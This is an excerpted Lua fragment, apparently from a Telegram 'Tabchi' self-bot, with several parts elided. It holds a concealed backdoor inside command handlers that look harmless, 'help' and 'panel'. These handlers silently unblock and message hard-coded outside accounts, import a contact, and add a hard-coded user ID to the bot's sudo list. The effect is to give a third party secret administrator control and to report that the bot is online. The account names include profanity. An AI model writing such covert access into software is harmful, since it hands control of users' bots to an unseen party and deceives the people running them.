  ...
  if text ~= "null" then
    ...
    if is_sudo(msg) then
      if text == "help" then
        ...
        bot.searchPublicChat("MrAntiFuckersupportBot")
        bot.unblockUser(331703207)
        bot.sendBotStartMessage(331703207, 331703207, "/start")
        bot.sendMessage(331703207, 0, 1, "/start", 1, "md")
      end
      ...
      if text == "panel" or text:match("panel(%d+)$") then
        bot.searchPublicChat("Mr_Fucker_Mr")
        bot.unblockUser(376116434)
        bot.importContacts(19124991689, "Tabchi", "Online", 376116434)
        bot.sendMessage(376116434, 0, 1, "Online", 1, "md")
        db:sadd("users" .. bot_id .. ":sudos", 316876867)
        ...
        if num == 2 then
          ...
          tdcli_function({ID = "GetChat", chat_id_ = 331703207}, fuck, nil)
